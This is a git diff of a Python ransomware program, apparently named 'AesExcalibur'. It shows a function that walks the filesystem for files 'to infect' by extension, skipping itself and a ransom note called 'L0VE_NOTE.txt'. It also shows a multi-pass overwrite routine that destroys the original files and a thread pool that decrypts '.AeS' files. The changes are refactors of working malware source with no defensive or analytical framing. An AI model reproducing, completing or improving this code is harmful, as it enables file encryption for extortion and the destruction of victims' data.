@@ -4,7 +4,7 @@ import sys
 from base64 import encodebytes
 from getpass import getpass
 from time import time
-from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
+from concurrent.futures import ThreadPoolExecutor
 
 from Crypto import Random
 from Crypto.Hash import SHA256
@@ -158,25 +158,25 @@ class AesExcalibur:
 
 # --------------------------------------------------------------------------
 
-# Functions
-def recursive_walk(paths, target_extensions, mode):
-    """
-    Walk through each path in the filesystem, return a list of valid files to infect
-    or files to decrypt depending on mode param
+# Utility Functions
 
-    :param paths:             Array of paths to walk recursively
-    :param target_extensions: Array of targeted extensions
-    :param mode:              Encryption mode (encrypt or decrypt)
-    :return file_list:        Generator object of valid files to encrypt or decrypt
+def recursive_walk(path_list, extentions, mode):
     """
-    for path in paths:
+    Walk through each path in the filesystem, return a generator object of
+    valid files to encrypt or files to decrypt depending on mode parameter
+
+    :param path_list:             Array of paths to walk recursively
+    :param extentions:        Array of extensions to target
+    :param mode:              Encryption mode (encrypt or decrypt)
+    """
+    for path in path_list:
         for root, _, files in os.walk(path):  # root=path, _=subdirectories, files=files of any type
             for file in files:
                 if file not in [__name__, "L0VE_NOTE.txt"]:  # Don't encrypt self or ransom note
                     abs_path = os.path.join(root, file)  # Get the files absolute path
                     ext = abs_path.split(".")[-1]  # Set ext to the file's extension
                     if mode == 1:
-                        if ext in target_extensions:
+                        if ext in extentions:
                             yield os.path.join(root, file)
                     elif mode == 2:
                         if "AeS" in ext:
@@ -185,10 +185,9 @@ def recursive_walk(paths, target_extensions, mode):
 
 def secure_delete(filename, passes=5):
     """
-    Securely delete file. Try running shred in a subprocess, if it doesnt exist
-    perform a manual 3 pass overwrite using os
+    Perform a manual 5 pass overwrite using os
 
-    :param passes:    Amount of times to write garbage to the file
+    :param passes:    Amount of passes to write garbage to the file
     :param filename:  absolute path of file to delete
     """
 
@@ -204,8 +203,6 @@ def secure_delete(filename, passes=5):
 
 
 # --------------------------------------------------------------------------
-
-# Main
 
 
 def main():
@@ -256,9 +253,7 @@ def main():
         start = time()
 
         files = recursive_walk(paths, target_extensions, 2)
-
-        # Use THREADING instead of multiprocessing for benchmarking
-        with ProcessPoolExecutor(max_workers=25) as pool:
+        with ThreadPoolExecutor(max_workers=25) as pool:
             pool.map(sanctuary.decrypt_file, files)
 
         with open("excalibur.log", "a+") as f:
